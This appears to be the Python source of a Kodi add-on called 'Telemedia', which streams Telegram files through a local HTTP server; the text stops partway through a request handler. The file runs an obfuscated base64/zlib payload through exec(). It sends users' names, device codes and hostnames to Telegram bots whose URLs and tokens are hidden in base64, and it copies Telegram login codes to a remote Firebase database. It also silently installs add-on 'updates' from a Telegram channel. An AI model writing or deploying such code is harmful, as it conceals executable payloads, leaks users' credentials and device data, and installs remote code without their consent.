# -*- coding: utf-8 -*-
#
# Copyright Aliaksei Levin (levlam@telegram.org), Arseny Smirnov (arseny30@gmail.com),
# Pellegrino Prevete (pellegrinoprevete@gmail.com)  2014-2019
#
# Distributed under the Boost Software License, Version 1.0. (See accompanying
# file LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)
#


from ctypes import *
import platform,os,sys,json,re,logging,socket,posixpath,urllib,random,mimetypes,os,time,shutil,threading

from shutil import copyfile
from threading import Thread
from packaging import version
from contextlib import closing
import http.server as BaseHTTPServer
import socketserver as SocketServer

try:
    import xbmc,xbmcaddon,xbmcgui,xbmcvfs
    Addon = xbmcaddon.Addon()
    on_xbmc=True
except:
    on_xbmc=False

translatepath=xbmcvfs.translatePath
dir_path = os.path.dirname(os.path.realpath(__file__))
telemaia_icon=os.path.join(dir_path,'icon.png')
global complete_size,event,data_to_send,ready_data,stop_listen,create_dp_new,server,client,file_path,size,in_tans
global last_link,post_box,send_login,stop_now,in_install
global pending_install,all_folders
all_folders={}
pending_install={}
in_install=0
stop_now=False
last_link='empty'
send_login=0
complete_size=0
global total_size,ready_size,ready_size_pre,global_id,global_offset,global_end,global_path,global_size,wait_for_download,wait_for_download_photo,wait_for_download_complete,file_size,downn_path,global_f
global_f=None
downn_path={}
file_size={}
ready_size=0
total_size=0
ready_size_pre=0
wait_for_download_photo=0
global_id=0
global_offset=0
global_end=0
global_path=0
global_size=0
wait_for_download=0
wait_for_download_complete=0
post_box={}
in_tans=0
server=0
size=0
file_path=''
client=0
create_dp_new=0

user_dataDir = xbmcvfs.translatePath(Addon.getAddonInfo("profile"))
addon_path=os.path.join(user_dataDir, 'addons')
logo_path=os.path.join(user_dataDir, 'logo')
try:

    if not xbmcvfs.exists(logo_path+'/'):
         os.makedirs(logo_path)
    icons_path=os.path.join(user_dataDir, 'icons')
    if not xbmcvfs.exists(icons_path+'/'):
         os.makedirs(icons_path)
    addon_path=os.path.join(user_dataDir, 'addons')
    if not xbmcvfs.exists(addon_path+'/'):
         os.makedirs(addon_path)
    addon_extract_path=os.path.join(user_dataDir, 'addons','temp')
    if not xbmcvfs.exists(addon_extract_path+'/'):
         os.makedirs(addon_extract_path)
    if not xbmcvfs.exists(addon_extract_path+'/'):
         os.makedirs(addon_extract_path)
except: pass

try:

    shutil.rmtree(os.path.join(translatepath("special://userdata/"),"addon_data","plugin.video.telemedia","files"))
except:
    pass
try:
    remove2=os.path.join(translatepath("special://home/"),"userdata","addon_data","plugin.video.telemedia","fan")
    if os.path.exists(remove2):
        for root, dirs, files in os.walk(remove2):
            for f in files:
                os.unlink(os.path.join(root, f))
            for d in dirs:
                shutil.rmtree(os.path.join(root, d))
        os.rmdir(remove2)
except:
    pass
try:    
    os.remove(os.path.join(translatepath("special://userdata/"),"addon_data","plugin.video.telemedia","database","db.sqlite"))
except:
    pass
if on_xbmc:
    if Addon.getSetting("autologin")=='true':
        stop_listen=0
    else:
        stop_listen=2
else:
    stop_listen=0
ready_data=''
data_to_send=''
event=''

COLOR2='yellow'
COLOR1='white'
ADDONTITLE='Telemedia'
update='עדכון מהיר זמין עבורכם'
DIALOG         = xbmcgui.Dialog()
file_data=''
file_code=''
nameSelect=[]
logSelect=[]
def LogNotify(title, message, times=3500, icon=telemaia_icon,sound=False):
	DIALOG.notification(title, message, icon, int(times), sound)
def find_free_port():
    with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as s:
        s.bind(('', 0))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return s.getsockname()[1]
def read_firebase(table_name):
        from resources.modules.firebase import firebase
        firebase = firebase.FirebaseApplication('https://%s-default-rtdb.firebaseio.com'%Addon.getSetting("firebase"), None)
        result = firebase.get('/', None)
        if table_name in result:
            return result[table_name]
        else:
            return {}
def get_telenum(file_data):
            all_db=read_firebase('tele')
            data=[]
            for itt in all_db:
                items=all_db[itt]
                data.append((items['number']))
            for file_data in data:

                return file_data
def get_telecode(file_code):
            all_db=read_firebase('telec')
            data=[]
            for itt in all_db:
                items=all_db[itt]
                data.append((items['code']))
            for file_code in data:

                return file_code
                
                
code_link='empty'
def read_firebase_c(table_name):
    from resources.modules.firebase import firebase
    fire = firebase.FirebaseApplication('https://telemedia-vip-default-rtdb.firebaseio.com', None)
    result = fire.get('/', None)
    if table_name in result:
        return result[table_name]
    else:
        return {}
def read_phone():
    all_db=read_firebase_c('telephone')
    data=[]
    for itt in all_db:
        items=all_db[itt]
        data.append((items['pin']))
    for pin in data:
       if len(pin)==12 or len(pin)==11:
        return pin
def readcode():
    all_db=read_firebase_c('telecode')
    data=[]
    for itt in all_db:
        items=all_db[itt]
        data.append((items['pin']))
    for pin in data:
       if len(pin)==5:
        return pin
def get_phone(code_link):
    #VIP
    stop_time = time.time() + 1200
    while(code_link=='empty' or code_link==None):
          code_link=read_phone()
          
          if time.time() > stop_time:
            # code_link='play_tele'
            stop_listen=2
            code_link=''
            break
    return code_link
def get_pincode(code_link):
    #VIP
    stop_time = time.time() + 1200
    while(code_link=='empty' or code_link==None):
          code_link=readcode()
          if time.time() > stop_time:
            # code_link='play_tele'
            stop_listen=2
            break
    return code_link

def read_ok():
    all_db=read_firebase_c('telecode')
    data=[]
    resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
    user= resuaddon.getSetting("user")
    
    for itt in all_db:
        items=all_db[itt]
        data.append((items['pin']))
    for pin in data:
       if pin==user.lower():
        return True
        
def write_firebase_telemedia(pin,table_name):
    from resources.modules.firebase import firebase
    fb_app = firebase.FirebaseApplication('https://telemedia-vip-default-rtdb.firebaseio.com', None)


    result = fb_app.post(table_name, {'pin':pin})
    return 'OK'
def delete_firebase_telemedia(table_name,record):
    from resources.modules.firebase import firebase
    fb_app = firebase.FirebaseApplication('https://telemedia-vip-default-rtdb.firebaseio.com', None)
    result = fb_app.delete(table_name, record)
    return 'OK'
        
def get_ok(code_link):
    #VIP
    stop_time = time.time() + 1200
    while(code_link=='empty' or code_link==None):
          LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'Telemedia VIP'),'[COLOR %s]המתן לתגובה מ Anonymous TV...[/COLOR]' % COLOR2)
          code_link=read_ok()
          if time.time() > stop_time:
            code_link=False
    return code_link





free_port=find_free_port()
if on_xbmc:
    if free_port!=int(Addon.getSetting("port")): 
        Addon.setSetting("port",str(free_port))
        # xbmc.executebuiltin('Container.Refresh')
else:
    file = open('port.txt', 'w') 
    file.write(str(free_port))
    file.close()
PORT_NUMBER =free_port


__version__ = "0.1"
def check_login1(event):

    if 'message' in event:
        
        if 'content' in event['message']:
            if 'text' in event['message']['content']:
                if 'Login code' in event['message']['content']['text']['text']:
                    A=event['message']['date']
                    B=datetime.datetime().timestamp()
                    if int(B)>A:
                     msg=event['message']['content']['text']['text'].split('.')
                     xbmcgui.Dialog().ok('Telemedia Code',str(msg[0]))
                     
def check_login(event):
    x=[-809302766]
    
    if 'message' in event:

            if 'text' in event['message']['content']:

                if (event['message']['chat_id']) in x:
                    if 'Login code' in event['message']['content']['text']['text']:
                        A=event['message']['date']
                        B=datetime.datetime().timestamp()
                        if int(B)>A:
                         msg=event['message']['content']['text']['text'].split('.')
                         xbmcgui.Dialog().ok('Telemedia Code',str(msg[0]))
def check_notify_TEST(event):
    HOME= translatepath('special://home/')
    ADDONS           = os.path.join(HOME,      'addons')
    messageid=-1001724114097 # קבוצה לצבע אדום
    import datetime,random
    logging.warning('434343event444444343'+str(event))
    if 'message' in event:
                all_ids=[messageid]
                
                if 'text' in event['message']['content']:

                      if (event['message']['chat_id']) in all_ids:
                        
                        num=random.randint(0,60000)
                        idmessage=event['message']['id']
                        # message_thread_id=event['message']['message_thread_id']

                        td_send({'@type': 'getMessage','chat_id':-1001724114097,'message_id':idmessage,'@extra':num})
                        # td_send({'@type': 'viewMessages','chat_id':-1001724114097,'message_thread_id':message_thread_id,'message_ids':[idmessage],'force_read':True, '@extra':num})

                        # if event['message']['interaction_info']['view_count']==1:
                           
                          # msg=event['message']['content']['text']['text']
                          # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', msg))) 

                        dddw=event['message']['date']
                        epoch = datetime.datetime.now().timestamp()
                        
                        msg=event['message']['content']['text']['text']

                        if str(int(epoch)) == str(dddw):

                            msg=event['message']['content']['text']['text']
                            xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', msg)))
                            
def get_login_code(event):
    import datetime
    if 'message' in event:
        if 'content' in event['message']:
            if "Message has protected content and can't be forwarded" == event['message']:
                return
            if 'text' in event['message']['content']:
                if 'Login code' in event['message']['content']['text']['text']:
                    dddw=event['message']['date']
                    epoch = datetime.datetime.now().timestamp()
                    # if str(dddw+1)>str(int(epoch)):
                    if str(dddw+1)>str(int(epoch)):
                        msg=event['message']['content']['text']['text'].split('.')
                        
                        regex='[0-9]+'
                        text2=re.compile(regex).findall(str(msg))
                        
                        pin=text2[0]
                        all_firebase=read_firebase_c('telecode')
                        if all_firebase=={}:
                            write_firebase_telemedia(pin,'telecode')
                            send_info('send_login','שולח קוד דרך הקודי')
                            time.sleep(5)
                            all_firebase=read_firebase_c('telecode')
                            for items in all_firebase:
                              
                              delete_firebase_telemedia('telecode',items)

                        # else:
                            # # all_firebase=read_firebase_c('telecode')
                            # for items in all_firebase:
                                # delete_firebase_telemedia('telecode',items)
                                # write_firebase_telemedia(pin,'telecode')
                                # send_info('send_login','שולח קוד דרך הקודי')
                                # time.sleep(5)
                            # all_firebase=read_firebase_c('telecode')
                            # for items in all_firebase:
                               # delete_firebase_telemedia('telecode',items)



def check_name(id):
        global post_box
 
        
        num=random.randint(0,60000)
        td_send({'@type': 'getChat','chat_id':id, '@extra':num})
        
        
  
        event=wait_response_now(num,timeout=10)
        
        if event['notification_settings']['mute_for']>0 or event['notification_settings']['use_default_mute_for']==True:
            return 'off','off'
        
        chat_name='UNK'
        f_name=str(event['id'])+'_small.jpg'
        icon=os.path.join(logo_path,f_name)
        if event:
            
            chat_name=event['title']
            
            if 'photo' in event:
                if 'small' in event['photo']:
                    icon_id=event['photo']['small']['id']
                    f_name=str(event['id'])+'_small.jpg'
                    icon=os.path.join(logo_path,f_name)
            
        
        return chat_name,icon
def update_addon():
    
    try:
        global in_install,pending_install

        while xbmc.Player().isPlaying() or in_install==1:
            time.sleep(0.1)
        in_install=1
        # counter_ten=10
        from resources.default import install_addon
        
        # while(counter_ten)>0:
            # counter_ten-=1
            # time.sleep(1)
        for items in pending_install:
            f_name=pending_install[items]['f_name']
            
            link_data=pending_install[items]['link_data']
            c_f_name=pending_install[items]['c_f_name']
            ver=pending_install[items]['version']
            cur_version=pending_install[items]['cur_version']
            install_addon(f_name,json.dumps(link_data),silent=True)
            if on_xbmc:
                
                LogNotify('[COLOR yellow]הרחבה עודכנה[/COLOR]',f_name.replace('.zip',''))

                t = Thread(target=send_info, args=('addons_update','הרחבה עודכנה: '+c_f_name +'\n'+'מגירסה מספר: '+ str(cur_version)+' '+'לגירסה: '+ str(ver),))
                t.start()

        pending_install={}
        in_install=0
    
    except Exception as e:
            import linecache,sys
            exc_type, exc_obj, tb = sys.exc_info()
            f = tb.tb_frame
            lineno = tb.tb_lineno
            filename = f.f_code.co_filename
            linecache.checkcache(filename)
            line = linecache.getline(filename, lineno, f.f_globals)
            logging.warning('ERROR IN Auto Install:'+str(lineno))
            logging.warning('inline:'+str(line))
            logging.warning(str(e))
            in_install=0
            pending_install={}
    
def has_addon(name):
    ex=False
    if name=='plugin.program.Settingz':
     name='plugin.program.Settingz-Anon'
    if xbmc.getCondVisibility("System.HasAddon(%s)" % name):

        ex=True
    else:
        addon_path=os.path.join(xbmcvfs.translatePath("special://home"),'addons/')

        all_dirs=[]
        for items in os.listdir(os.path.dirname(addon_path)):
            all_dirs.append(items.lower())
        if name.lower() in all_dirs:
            
            ex=True
    ver=''
    if ex:
        ver=((xbmc.getInfoLabel('System.AddonVersion(%s)'%name)))
        
        if len(ver)==0:
            addon_path=os.path.join(xbmcvfs.translatePath("special://home"),'addons/')
            cur_folder=os.path.join(addon_path,name)
            try:
                file = open(os.path.join(cur_folder, 'addon.xml'), 'r') 
                file_data= file.read()
                file.close()
            except:
                file = open(os.path.join(cur_folder, 'addon.xml'), 'r', encoding="utf8") 
                file_data= file.read()
                file.close()
            regex='name=.+?version=(?:"|\')(.+?)(?:"|\')'
            ver=re.compile(regex,re.DOTALL).findall(file_data)[0]
        
    return ex,ver
import base64,codecs# td
exec(codecs.decode(base64.b64decode(r'IyMgQ29tcHJlc3NvciBtYWRlIGJ5OiBBbm9ueW1vdXMKCgppbXBvcnQgemxpYgppbXBvcnQgY29kZWNzCmltcG9ydCBiYXNlNjQKZXhlYyhjb2RlY3MuZGVjb2RlKHpsaWIuZGVjb21wcmVzcyhieXRlcyhiJ3hceGRhXHJceGNhMVxuXHg4MDBceDBjXHgwNVx4ZDBceGUzdFx4Y2JceGRmXHgwNW9ceGUxLlx4OTFceDA0XHgxYitWXHg5Mlx4YThceGUwXHhlOVx4ZjVceGNkL1x4ZDRvXHhmNXlceGI3ZSw1XHhmM1x4OGNceDAxXHgxMFstKVRceGE1XHhmNkhceGQyXHgwYlx4YWRceDhiXHhlMVx4YjFceDk3XTBceGM5XHg5ZiFceDljTFtceGY0XHhhM3xCLFx4MThceDhmJykpKSk=')))
def check_update (event):
    global pending_install,in_install
    update_addon_ok=False
    if 'message' in event:

        if 'chat_id' in event['message']:
            all_ids=['-1001759184473']
            # if ',' in Addon.getSetting("update_chat_id"):
                # all_ids=Addon.getSetting("update_chat_id").split(',')
            # else:
                # all_ids=[Addon.getSetting("update_chat_id")]
            if str(event['message']['chat_id']) in all_ids:

                if 'content' in event['message']:
                    items=event['message']
                    if 'document' in event['message']['content']:

                        if 'file_name' in event['message']['content']['document']:
                            f_name=event['message']['content']['document']['file_name']
                            if '.zip' not in f_name:
                                return 0
                            c_f_name=f_name.split('-')
                            if len(c_f_name)==0:
                                return 0
                            c_f_name=c_f_name[0]
                            if '-' not in f_name:
                                return 0
                            new_addon_ver=f_name.split('-')[1].replace('.zip','')
                            if new_addon_ver=='Anon':
                                new_addon_ver=f_name.split('-')[2].replace('.zip','')

                            
                            if c_f_name in pending_install:
                                ex=True
                                cur_version=pending_install[c_f_name]['version']
                            else:
                                ex,cur_version=has_addon(c_f_name)

                            if ex:

                               if version.parse(cur_version) < version.parse(new_addon_ver):
                                while xbmc.Player().isPlaying():
                                    time.sleep(0.1)
                                if on_xbmc:
                                    LogNotify('[COLOR yellow]עדכון הרחבה[/COLOR] Ver:%s'%new_addon_ver,c_f_name)
                                    # xbmc.executebuiltin('Notification(%s, %s, %d)'%('[COLOR yellow]New Update[/COLOR] Ver:%s'%new_addon_ver,c_f_name, 500))
                                link_data={}
                                link_data['id']=str(items['content']['document']['document']['id'])
                                link_data['m_id']=items['id']
                                link_data['c_id']=items['chat_id']
                                update_addon_ok=True

                                pending_install[c_f_name]={'version':new_addon_ver,'f_name':f_name,'link_data':link_data,'c_f_name':c_f_name,'cur_version':cur_version}

                                if in_install==0:
                                    t = Thread(target=update_addon, args=())
                                    t.start()

    # if update_addon_ok:
        # xbmc.executebuiltin("UpdateLocalAddons()")
        # xbmc.executebuiltin("ReloadSkin()")
        # xbmc.sleep(1000)
        # xbmc.executebuiltin("Container.Refresh()")
def check_notify2(event):
    
    if 'message' in event:
        
        if 'content' in event['message']:
        
            if 'document' in event['message']['content']:
                if 'file_name' in event['message']['content']['document']:
                    #log.warning('Found send file')
                    chat_source=event['message']['chat_id']
                    chat_name,icon=check_name(chat_source)
                    if chat_name!='off':
                            
                        
                        nm=event['message']['content']['document']['file_name']
                        __icon__=icon
                        if on_xbmc:
                            LogNotify('[COLOR yellow]'+chat_name+'[/COLOR]',nm)
                            # xbmc.executebuiltin('Notification(%s, %s, %d, %s)'%('[COLOR yellow]'+chat_name+'[/COLOR]',nm, 5000, __icon__))
def platform_s():
	if xbmc.getCondVisibility('system.platform.android'):             return 'android'
	elif xbmc.getCondVisibility('system.platform.linux'):             return 'linux'
	elif xbmc.getCondVisibility('system.platform.linux.Raspberrypi'): return 'linux'
	elif xbmc.getCondVisibility('system.platform.windows'):           return 'windows'
	elif xbmc.getCondVisibility('system.platform.osx'):               return 'osx'
	elif xbmc.getCondVisibility('system.platform.atv2'):              return 'atv2'
	elif xbmc.getCondVisibility('system.platform.ios'):               return 'ios'
	elif xbmc.getCondVisibility('system.platform.darwin'):            return 'ios'



def send_info(mod='',txt=''):
    # try:
        import base64,requests
        import platform as plat
        que=urllib.parse.quote_plus
        try:
            resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
            userr= resuaddon.getSetting("user")
            dragon= resuaddon.getSetting("dragon")
            HARDWAER= resuaddon.getSetting("action")
            update= resuaddon.getSetting("update")
            userdate=resuaddon.getSetting("date_user")
            version=resuaddon.getAddonInfo('version')
            dragon= resuaddon.getSetting("dragon")
        except:
            from resources.modules import gaia
            resuaddon= 'no_wizard'
            userr='no_wizard'
            dragon='false'
            HARDWAER=''
            update=''
            userdate=''
            version=''

        kodiinfo=xbmc.getInfoLabel("System.BuildVersion")[:4]
        my_system = plat.uname()
        xs=my_system[1]
        if 'insert_phone'==mod:
            if dragon=='true':
                error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzY2MjUxODY6QUFGWWswSVBCdTROWjJ1WmxQWXpidVA5NkZyZ1B0UDhnUU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTc4ODIyNzI2MSZ0ZXh0PQ==').decode('utf-8')
                user_type='Dragon'
            else:
                error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode('utf-8')
                user_type='AnonymousTV'
        if 'open_t'==mod:
            if dragon=='true':
                error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzY2MjUxODY6QUFGWWswSVBCdTROWjJ1WmxQWXpidVA5NkZyZ1B0UDhnUU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTc4ODIyNzI2MSZ0ZXh0PQ==').decode('utf-8')
                user_type='Dragon'
            else:
                error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode('utf-8')
                user_type='AnonymousTV'
        if 'addons_update'==mod:#ערוץ עדכון הרחבות
          # txt='עדכון מהיר'
          # txt='שלח לוג'
            if dragon=='true':
                error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU4MDUzMzM1NzpBQUVzTjZPLU5QN05IU1B0eHc2UTZpVnVEa2dhZU1aUU1nOC9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNTcwNzQ3MjI0JnRleHQ9').decode('utf-8')
            else:
                error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0=').decode('utf-8')
        if 'sendtelemediapin'==mod:#קוד פתיחה שגוי

              if dragon=='true' and not txt=='סיסמת חבר':
                error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzY2MjUxODY6QUFGWWswSVBCdTROWjJ1WmxQWXpidVA5NkZyZ1B0UDhnUU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTc4ODIyNzI2MSZ0ZXh0PQ==').decode('utf-8')
                user_type='Dragon'
                
              else:
                error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode('utf-8')
                user_type='AnonymousTV'
        if 'send_login'==mod:
            error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode('utf-8')
            x=requests.get(error_ad +que(txt)+'\n'+que('שם משתמש: #')+userr).json()
            return
        x=requests.get(error_ad+que(txt)+'\n'+que('שם משתמש: #')+userr+'\n'+que('קוד מכשיר: ')+(HARDWAER)+'\n'+que('מנוי: ')+userdate+'\n'+que('קודי: ')+kodiinfo+'\n'+que('מערכת הפעלה: ')+platform_s()+'\n'+que('שם המערכת: ')+xs+'\n'+que('גירסת ויזארד: ')+version+'\n'+update).json()
        if 'sendtelemediapin'==mod and txt=='קוד טלמדיה':
            x=requests.get(error_ad + '$$$'+userr).json()
            if dragon=='false':
                x=requests.get(error_ad + '***auto***'+userr).json()
            else:
                x=requests.get(error_ad + '***autodragon***'+userr).json()
    # except:pass

def get_file_size(id):
    global post_box
    import random
    num=random.randint(0,60000)
    post_box[num]={'@type':'td_send','data':{'@type': 'getFile','file_id':int(id), '@extra': num},'status':'pending','responce':None}

    event=wait_response(num)
    return  event['size'],event['local']['path'],event['local']['downloaded_prefix_size']

def download_buffer(id,offset,limit):
            global post_box
            # print ('Download Buffer')
            path=''
            size=''
            # print ('Start:'+str(offset))
            # print ('End:'+str(limit))
            num=random.randint(0,60000)
            post_box[num]={'@type':'td_send','data':{'@type': 'downloadFile','file_id':int(id), 'priority':1,'offset':offset,'limit':limit, '@extra': num},'status':'pending','responce':None}
            event=wait_response(num)
            time.sleep(5)


def wait_download_file_complete(id,start_range,end_range):
    global global_id,global_offset,global_end,global_path,global_size,wait_for_download_complete
    global_path=''
    global_size=''
    global_id=id
    global_offset=start_range
    global_end=end_range 
    wait_for_download_complete=1
    while(wait_for_download_complete>0):
        time.sleep(0.001)
    return global_path
    
def wait_download_file_photo(id,start_range,end_range):
    global global_id,global_offset,global_end,global_path,global_size,wait_for_download_photo
    global_path=''
    global_size=''
    global_id=id
    global_offset=start_range
    global_end=end_range 
    wait_for_download_photo=1
    dp = xbmcgui.DialogProgressBG()

    dp.create('[B][COLOR=green]      Telemedia                                       [/COLOR][/B]', '[B][COLOR=yellow]Login[/COLOR][/B]')
    time_out=0
    while(wait_for_download_photo>0):
        try:
            dp.update(int((ready_size*100.0)/(complete_size+1)),'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Downloading  [/COLOR][/B]')
        except:
            pass
        time_out+=1
        if (time_out>50000):
            break
        time.sleep(0.001)
    dp.close()
    return global_path
def wait_download_file(id,start_range,end_range):
    global global_id,global_offset,global_end,global_path,global_size,wait_for_download
    global_path=''
    global_size=''
    global_id=id
    global_offset=start_range
    global_end=end_range 
    wait_for_download=1
    while(wait_for_download>0):
        time.sleep(0.001)
    return global_path,global_size
def download_photo(id,offset,end,event):
    file_path=''
    if event:
        j_enent=(event)
        file='None'
        if 'id' in j_enent :
            
            if j_enent['id']==id:
                file_path=j_enent['local']['path']
        elif "@type" in j_enent:
                    if 'updateFile' in j_enent['@type']:
                        if "file"  in j_enent:
                            if j_enent["file"]['id']==int(id):
                                if j_enent["file"]['local']['is_downloading_completed']==True:
                                    file_path=j_enent["file"]['local']['path']
        if 'expected_size' in event :

                    if len(event['local']['path'])>0 and (event['local']['is_downloading_completed']==True):
                        
                        path=event['local']['path']
                      
                        file_path=path
    
    return file_path
def download_file_complete(id,offset,end,event):
            global file_path
            path=''
            size=''
            if 1:
                if event:
                    if 'updateFile' in event['@type']:
                        if len(event['file']['local']['path'])>0 :
                            path=event['file']['local']['path']
                            size=event['file']['size']
                            file_path=path
                    if 'expected_size' in event :
                            if len(event['local']['path'])>0  :
                                #logging.warning('Found Complete in buffer')
                                path=event['local']['path']
                                size=event['size']
                                file_path=path
            return path,size
def download_file_out(id,offset,end,event):
            global file_path
            path=''
            size=''
            if (end-offset)>10000000:
                 # buf=int(Addon.getSetting("buffer_size"))
                buf=int(Addon.getSetting("buffer_size_new4"))*1000000
            else:
                #buf=0x500
                buf=end-offset
            if 1:
                if event:
                    if 'updateFile' in event['@type']:
                        if len(event['file']['local']['path'])>0 and (event['file']['local']['downloaded_prefix_size']>=buf):
                            path=event['file']['local']['path']
                            size=event['file']['size']
                            file_path=path

                    if 'expected_size' in event :
                            if len(event['local']['path'])>0 and ((event['local']['downloaded_prefix_size']>=buf) or (event['local']['is_downloading_completed']==True)):
                                #logging.warning('Found Complete in buffer')
                                path=event['local']['path']
                                size=event['size']
                                file_path=path
            return path,size


class RangeHTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    """Simple HTTP request handler with GET and HEAD commands.

    This serves files from the current directory and any of its
    subdirectories.  The MIME type for files is determined by
    calling the .guess_type() method.

    The GET and HEAD requests are identical except that the HEAD
    request omits the actual contents of the file.

    """

    server_version = "RangeHTTP/" + __version__
    def check_if_buffer_needed(self,wanted_size):
        global ready_size,total_size
        try:
            g_timer=xbmc.Player().getTime()
            g_item_total_time=xbmc.Player().getTotalTime()
        except:
            g_timer=0
            g_item_total_time=0
        try:
          if g_item_total_time>0:
            needed_size=g_timer*(total_size/(g_item_total_time))
            slep=False
           
            notify=True
            while (ready_size<(wanted_size+100000)):
                #logging.warning('Paused:')
                if xbmc.Player().isPlaying()==False:
                    break
                time.sleep(1)
                if notify:
                    xbmc.executebuiltin(u'Notification(%s,%s)' % ('Telemedia', 'Buffering:'+str(ready_size)+'/'+str(wanted_size)))
                    notify=False
            return 'ok'
        # except:pass
        except Exception as e:
            logging.warning('Check buffer err:'+str(e))
    def do_GET(self):
        try:
            global in_tans
            if stop_listen!=1:
                self.send_response(200)
                self.send_header('Content-type','text/html')
                self.end_headers()

                self.wfile.write('Not Logged In')
                return 0
            """Serve a GET request."""


            f, start_range, end_range = self.send_head()
            if f:
                #logging.warning ("do_GET: Got (%d,%d)" % (start_range,end_range))
                #time.sleep(1)
                f.seek(start_range, 0)
                #time.sleep(5)
                chunk =int(Addon.getSetting("chunk_size_new4")) *1024
                total = 0
                all_chunk=0
                self.stop_now=0
                adv_buffer=Addon.getSetting("advance_buffer")=='true'
                while chunk > 0:
                    

                    if (start_range + chunk) > (end_range):
                        
                        chunk = end_range - start_range
                    if adv_buffer:
                        self.check_if_buffer_needed(start_range + chunk)
                    
                    error=True
                    counter_error=0
                    
                    try:
                        a=f.read(chunk)
                        #log.warning(a)
                        time.sleep(0.1)
                        self.wfile.write(a)
                        
                    except Exception as e:
                        #log.warning( 'ERRRRRRRRRRRRRRRRRRRRRRR:'+str(e))
                         break
                    # try:
                        # a=f.read(chunk)
                    # except Exception as e:
                        # #logging.warning( 'ERRRRRRRRRRRR333333:'+str(e))
                        # pass
                    # try:
                        
                        
                        # self.wfile.write(a)
                    # except Exception as e:
                        # # logging.warning( 'ERRRRRRRRRRRRRRRRRRRRRRR:'+str(e))
                         # break
                         '''
                        time.sleep(0.1)
                        try:
                            self.wfile.write(a)
                        except Exception as e:
                            #logging.warning( 'ERRRRRRRRRRRRR2222222:'+str(e))
                            break
                         '''
                    total += chunk
                    #time.sleep(0.001)
                    start_range += chunk
                f.close()
                
        except Exception as e:
            import linecache,sys
            exc_type, exc_obj, tb = sys.exc_info()
            f = tb.tb_frame
            lineno = tb.tb_lineno
            filename = f.f_code.co_filename
            linecache.checkcache(filename)
            line = linecache.getline(filename, lineno, f.f_globals)
            logging.warning('ERROR IN Telemdia get:'+str(lineno))
            logging.warning('inline:'+str(line))
            logging.warning(str(e))
    def do_POST(self):
        try:
            global event,data_to_send,ready_data,stop_listen,create_dp_new,client,in_tans
            global post_box,file_size,downn_path,send_login,ready_size,total_size
            global last_link,stop_now
            content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
            post_data = json.loads(self.rfile.read(content_length)) # <--- Gets the data itself
            #logging.warning(str(post_data))
            if stop_listen==0 or stop_listen==2:
                
                if stop_listen==2:
                    
                    if post_data['type']=='login':

                        create_dp_new=0

                        client = td_json_client_create()
                        td_send({'@type': 'getAuthorizationState', '@extra': 1.01234})
                        stop_listen=0
                            
                        ready_data={'status':'Not logged in'}
                    else:
                        if stop_listen==0:
                            dt='Wait for loggin'
                        else:
                            dt='Needs to log from setting'
                        ready_data={'status':dt,'stop':stop_listen}
                else:
                        # print בוטל('Still on login')
                        ready_data={'status':'Still on login'}
                self.send_response(200)
                self.send_header('Content-type','text/html')
                self.end_headers()
                
                
                try:
                   self.wfile.write(json.dumps(ready_data))
                except:
                   self.wfile.write(bytes(json.dumps(ready_data),"utf-8"))
            elif stop_listen==1:
                if post_data['type']=='login':
                    td_send({'@type': 'getAuthorizationState', '@extra': 1.91234})
                    ready_data={'status':'Logged in'}
                
                ready_data=''
                if post_data['type']=='td_send':

                    post_box[json.loads(post_data['info'])['@extra']]={'@type':'td_send','data':json.loads(post_data['info']),'status':'pending','responce':None}

                    ready_data=wait_response(json.loads(post_data['info'])['@extra'])
                elif post_data['type']=='stop_now':
